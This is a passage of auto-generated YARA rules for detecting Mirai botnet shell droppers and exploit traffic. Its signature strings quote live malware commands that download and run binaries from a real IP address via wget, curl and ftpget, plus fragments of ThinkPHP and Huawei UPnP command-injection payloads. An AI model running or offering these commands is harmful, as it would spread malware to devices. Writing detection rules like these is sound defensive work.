      $s11 = " chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" fullword ascii /* score: '11.00'*/
      $s12 = "RL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s13 = "Content-Length: 430" fullword ascii /* score: '9.00'*/
      $s14 = "Content-Length: 227" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 400KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Mirai_signature__77118b43_Mirai_signature__b7a9a0ba_79 {
   meta:
      description = "dropzone - from files Mirai(signature)_77118b43.sh, Mirai(signature)_b7a9a0ba.sh"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2025-08-29"
      hash1 = "77118b438e2442a04d8f1ef8e86a5a0f89d9be9c35dd9cf5d592c899ffe82b1b"
      hash2 = "b7a9a0ba03113005d17ef270177fed0cd993c126f59288eb3f8c242decd19a14"
   strings:
      $x1 = "cd /tmp; wget http://163.61.39.201/x86; curl -O http://163.61.39.201/x86; ftpget -v 163.61.39.201 x86 x86; chmod 777 x86; ./x86 " ascii /* score: '31.00'*/
      $x2 = "cd /tmp; wget http://163.61.39.201/mpsl; curl -O http://163.61.39.201/mpsl; ftpget -v 163.61.39.201 mpsl mpsl; chmod 777 mpsl; ." ascii /* score: '31.00'*/
      $x3 = "cd /tmp; wget http://163.61.39.201/mips; curl -O http://163.61.39.201/mips; ftpget -v 163.61.39.201 mips mips; chmod 777 mips; ." ascii /* score: '31.00'*/
      $x4 = "cd /tmp; wget http://163.61.39.201/arm6; curl -O http://163.61.39.201/arm6; ftpget -v 163.61.39.201 arm6 arm6; chmod 777 arm6; ." ascii /* score: '31.00'*/
      $x5 = "cd /tmp; wget http://163.61.39.201/m68k; curl -O http://163.61.39.201/m68k; ftpget -v 163.61.39.201 m68k m68k; chmod 777 m68k; ." ascii /* score: '31.00'*/
      $x6 = "cd /tmp; wget http://163.61.39.201/sh4; curl -O http://163.61.39.201/sh4; ftpget -v 163.61.39.201 sh4 sh4; chmod 777 sh4; ./sh4 " ascii /* score: '31.00'*/
      $x7 = "cd /tmp; wget http://163.61.39.201/arm7; curl -O http://163.61.39.201/arm7; ftpget -v 163.61.39.201 arm7 arm7; chmod 777 arm7; ." ascii /* score: '31.00'*/
      $x8 = "cd /tmp; wget http://163.61.39.201/i486; curl -O http://163.61.39.201/i486; ftpget -v 163.61.39.201 i486 i486; chmod 777 i486; ." ascii /* score: '31.00'*/
      $x9 = "cd /tmp; wget http://163.61.39.201/x86_64; curl -O http://163.61.39.201/x86_64; ftpget -v 163.61.39.201 x86_64 x86_64; chmod 777" ascii /* score: '31.00'*/
      $x10 = "cd /tmp; wget http://163.61.39.201/i686; curl -O http://163.61.39.201/i686; ftpget -v 163.61.39.201 i686 i686; chmod 777 i686; ." ascii /* score: '31.00'*/
      $x11 = "cd /tmp; wget http://163.61.39.201/spc; curl -O http://163.61.39.201/spc; ftpget -v 163.61.39.201 spc spc; chmod 777 spc; ./spc " ascii /* score: '31.00'*/
      $x12 = "cd /tmp; wget http://163.61.39.201/ppc; curl -O http://163.61.39.201/ppc; ftpget -v 163.61.39.201 ppc ppc; chmod 777 ppc; ./ppc " ascii /* score: '31.00'*/
      $x13 = "cd /tmp; wget http://163.61.39.201/arm; curl -O http://163.61.39.201/arm; ftpget -v 163.61.39.201 arm arm; chmod 777 arm; ./arm " ascii /* score: '31.00'*/
      $x14 = "cd /tmp; wget http://163.61.39.201/arm5; curl -O http://163.61.39.201/arm5; ftpget -v 163.61.39.201 arm5 arm5; chmod 777 arm5; ." ascii /* score: '31.00'*/
   condition:
      ( uint16(0) == 0x2123 and filesize < 7KB and ( 1 of ($x*) )
      ) or ( all of them )
}

